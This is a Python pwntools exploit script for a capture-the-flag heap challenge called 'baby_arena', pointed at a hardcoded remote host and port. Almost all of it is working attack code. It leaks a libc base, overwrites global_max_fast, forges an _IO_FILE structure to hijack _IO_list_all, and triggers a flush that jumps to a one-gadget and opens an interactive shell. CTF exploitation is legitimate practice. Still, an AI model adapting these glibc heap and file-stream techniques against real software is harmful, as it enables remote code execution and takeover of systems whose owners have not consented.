# File: exp.py
# Author: raycp
# Date: 2019-05-07
# Description: exp for baby_arena

from pwn_debug.pwn_debug import *

pdbg=pwn_debug("baby_arena")

pdbg.context.terminal=['tmux', 'splitw', '-h']

pdbg.local()
pdbg.debug("2.23")
pdbg.remote('34.92.37.22', 10002)
#p=pdbg.run("local")
#p=pdbg.run("debug")
p=pdbg.run("debug")
membp=pdbg.membp
#print hex(membp.elf_base),hex(membp.libc_base)
elf=pdbg.elf
libc=pdbg.libc
     
def add(size,note):
    p.recvuntil("exit")
    p.sendline("1")
    p.recvuntil("size")
    p.sendline(str(size))
    p.recvuntil("note")
    p.send(note)


def delete(idx):
    p.recvuntil("exit")
    p.sendline("2")
    p.recvuntil("id:")
    p.sendline(str(idx))

def login(name):
    p.recvuntil("exit")
    p.sendline("3")
    p.recvuntil("name")
    p.send(name)
    p.recvuntil("admin")
    p.sendline('1')

def build_fake_file(vtable):
    flag=0xfbad2887
    #flag&=~4
    #flag|=0x800
    fake_file=p64(flag)               #_flags
    fake_file+=p64(0)             #_IO_read_ptr
    fake_file+=p64(0)             #_IO_read_end
    fake_file+=p64(0)             #_IO_read_base
    fake_file+=p64(0)             #_IO_write_base
    fake_file+=p64(1)             #_IO_write_ptr
    fake_file+=p64(0)         #_IO_write_end
    fake_file+=p64(0)                    #_IO_buf_base
    fake_file+=p64(0)                    #_IO_buf_end
    fake_file+=p64(0)                       #_IO_save_base
    fake_file+=p64(0)                       #_IO_backup_base
    fake_file+=p64(0)                       #_IO_save_end
    fake_file+=p64(0)                       #_markers
    fake_file+=p64(0)                       #chain   could be a anathor file struct
    fake_file+=p32(1)                       #_fileno
    fake_file+=p32(0)                       #_flags2
    fake_file+=p64(0xffffffffffffffff)      #_old_offset
    fake_file+=p16(0)                       #_cur_column
    fake_file+=p8(0)                        #_vtable_offset
    fake_file+=p8(0x10)                      #_shortbuf
    fake_file+=p32(0)            
    fake_file+=p64(0)                    #_lock
    fake_file+=p64(0xffffffffffffffff)      #_offset
    fake_file+=p64(0)                       #_codecvt
    fake_file+=p64(0)                    #_wide_data
    fake_file+=p64(0)                       #_freeres_list
    fake_file+=p64(0)                       #_freeres_buf
    fake_file+=p64(0)                       #__pad5
    fake_file+=p32(0xffffffff)              #_mode
    fake_file+=p32(0)                       #unused2
    fake_file+=p64(0)*2                     #unused2
    fake_file+=p64(vtable)                       #vtable

    return fake_file

def pwn():
    
    #pdbg.bp()
    add(0x98,'a\n') #0
    add(0x98,'b\n') #1
    add(0x1400,'c\n') #2
    add(0x98,'d\n') #3
    add(0x98,'e\n') #4
    add(0x98,'e\n') #5

    delete(0)
    #pdbg.bp([0x40091b,0x400af2])
    ##step 1 leak libc address
    add(0x98,'\x78'+'\n')
    p.recvuntil("note is\n")
    stri=p.recvuntil('\x7f')
    #print len(stri),stri
    libc_base=u64(stri.ljust(8,'\x00'))-0x39bb78
    log.info("leak libc base: %s"%hex(libc_base))

    global_max_fast=libc_base+libc.symbols['global_max_fast']
    io_list_all=libc_base+libc.symbols['_IO_list_all']
    rce=libc_base+0xd5c07 
    name=p64(rce)+p64(global_max_fast-8)

    ## step 2 overwrite global_max_fast
    login(name)

    fastbin_ptr=libc_base+libc.symbols['main_arena']+8

    idx=(io_list_all-fastbin_ptr)/8
    size=idx*0x10+0x20
    print hex(size)
    delete(2)
    delete(4)
    data=p64(rce)*20
    add(0x98,data+'\n')
    name_ptr=0x6020b0 
    fake_file=build_fake_file(name_ptr-0x18)
    add(0x1400,fake_file[0x10:]+'\n')
    ## step 3 free into _IO_list_all
    delete(4)
    #delete(2)
    p.recvuntil("exit")
    p.sendline("1")
    p.recvuntil("size")
    p.sendline(str(256))
    ## step 4 trigger io flush to get shell
    data="\x10\x20"
    p.send(data)
    p.interactive() #get the shell

if __name__ == '__main__':
   pwn()

